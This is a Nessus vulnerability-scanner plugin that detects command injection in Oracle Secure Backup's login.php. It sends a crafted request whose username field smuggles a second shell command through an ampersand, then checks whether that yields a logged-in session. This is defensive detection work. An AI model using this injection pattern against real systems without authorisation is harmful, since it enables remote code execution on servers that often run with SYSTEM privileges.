#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) 
{
  script_id(35363);
  script_version("$Revision: 1.31 $");

  script_cve_id("CVE-2008-4006","CVE-2008-5448");
  script_bugtraq_id(33177);
  script_osvdb_id(51342, 51343);

  script_name(english:"Oracle Secure Backup Administration Server login.php Arbitrary Command Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows execution of
arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The remote version of Oracle Secure Backup Administration Server fails
to sanitize user-supplied input to various parameters used in the
'login.php' script before using it. 

By sending specially crafted arguments an attacker can exploit it to
execute code on the remote host with the web server privileges. 

By default the server runs with SYSTEM privileges under Windows." );
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=768
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5ad19c95" );
 script_set_attribute(attribute:"solution", value:
"Apply patches referenced in the vendor advisory above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"d2_elliot_name", value:"Oracle Secure Backup 10.2.0.2 RCE (Windows)");
 script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
script_set_attribute(attribute:"cpe",value:"cpe:/a:oracle:secure_backup");

 script_set_attribute(attribute:"plugin_publication_date", value: "2009/01/14");
 script_set_attribute(attribute:"patch_publication_date", value: "2009/01/13");
 script_cvs_date("$Date: 2016/12/07 21:08:18 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:oracle:secure_backup");
script_end_attributes();

 
  summary["english"] = "Checks for multiple remote command execution vulnerabilities in Oracle Secure Backup Administration Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("misc_func.inc");
include("global_settings.inc");
include("http.inc");

port = get_http_port(default:443, php: 1);

res = http_get_cache(item:"/login.php", port:port, exit_on_fail: 1);
if ("<title>Oracle Secure Backup Web Interface</title>" >!< res)
  exit(0);
 
soc = open_sock_tcp(port);
if (!soc) exit(0);

req = string (
      "GET /login.php?attempt=1&uname=nessus%20%26%20nessus HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "\r\n"
      );

send(socket:soc, data:req);
buf = recv(socket:soc, length:4096);

if (!egrep(string:buf, pattern:"^.*(PHPSESSID=[0-9a-z]+;).*$"))
  exit(0);

cookie = ereg_replace(string:buf, pattern:"^.*(PHPSESSID=[0-9a-z]+;).*$", replace:"\1");

req = string (
      "GET /index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Cookie: ", cookie, "\r\n",
      "\r\n"
      );

send(socket:soc, data:req);
buf = recv(socket:soc, length:10000, timeout:20);

if ("Logged in as" >< buf)
  security_hole(port);
